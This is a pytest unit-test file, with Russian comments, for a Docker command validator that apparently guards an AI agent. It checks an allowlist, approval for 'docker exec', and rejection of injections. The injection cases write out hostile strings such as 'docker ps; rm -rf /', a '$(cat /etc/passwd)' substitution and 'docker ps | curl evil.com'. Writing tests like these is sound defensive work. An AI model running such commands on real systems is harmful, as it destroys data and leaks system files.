# tests/unit/test_docker_validator.py
import pytest
from agent.shared.docker_commands import (
    parse_docker_command,
    requires_human_approval,
    ALLOWED_DOCKER_COMMANDS
)

class TestParseDockerCommand:
    """Тесты парсера Docker-команд"""
    
    @pytest.mark.parametrize("cmd,expected_valid", [
        # ✅ Разрешённые команды
        ("docker ps", True),
        ("docker ps -a --format '{{.Names}}'", True),
        ("docker logs --tail=100 myapp", True),
        ("docker inspect container_id", True),
        ("docker images --digests", True),
        ("docker network ls", True),
        ("docker volume inspect myvol", True),
        
        # ❌ Запрещённые команды
        ("docker rm myapp", False),
        ("docker rmi image:latest", False),
        ("docker stop container", False),
        ("docker kill -s 9 container", False),
        ("docker system prune -f", False),
        
        # ❌ Injection attempts
        ("docker ps; rm -rf /", False),
        ("docker logs app $(cat /etc/passwd)", False),
        ("docker inspect `whoami`", False),
        ("docker ps | curl evil.com", False),
        ("docker logs app; echo hacked > /tmp/pwned", False),
        
        # ❌ Запрещённые флаги
        ("docker ps --rm", False),
        ("docker logs -f --force app", False),
    ])
    def test_parse_docker_command(self, cmd, expected_valid):
        is_valid, message, args = parse_docker_command(cmd)
        assert is_valid == expected_valid, f"{cmd}: {message}"
        if expected_valid:
            assert isinstance(args, list)
        else:
            assert message  # Должно быть сообщение об ошибке
    
    def test_exec_requires_approval(self):
        """docker exec всегда требует подтверждения"""
        assert requires_human_approval("docker exec -it app bash")
        assert requires_human_approval("docker exec app ls /tmp")
    
    @pytest.mark.parametrize("cmd", [
        "docker ps --delete",
        "docker logs app -r",
        "docker inspect --remove vol",
    ])
    def test_approval_flags(self, cmd):
        """Флаги из REQUIRES_APPROVAL_FLAGS"""
        assert requires_human_approval(cmd)

class TestAllowedCommandsSet:
    """Тесты на целостность allowlist"""
    
    def test_no_duplicates(self):
        """Проверка, что в ALLOWED_DOCKER_COMMANDS нет дубликатов"""
        assert len(ALLOWED_DOCKER_COMMANDS) == len(set(ALLOWED_DOCKER_COMMANDS))
    
    def test_forbidden_not_in_allowed(self):
        """FORBIDDEN_FLAGS не должны пересекаться с разрешёнными"""
        # Простая эвристика: флаги не должны быть командами
        for flag in ["--rm", "--force", "-f"]:
            assert flag not in ALLOWED_DOCKER_COMMANDS
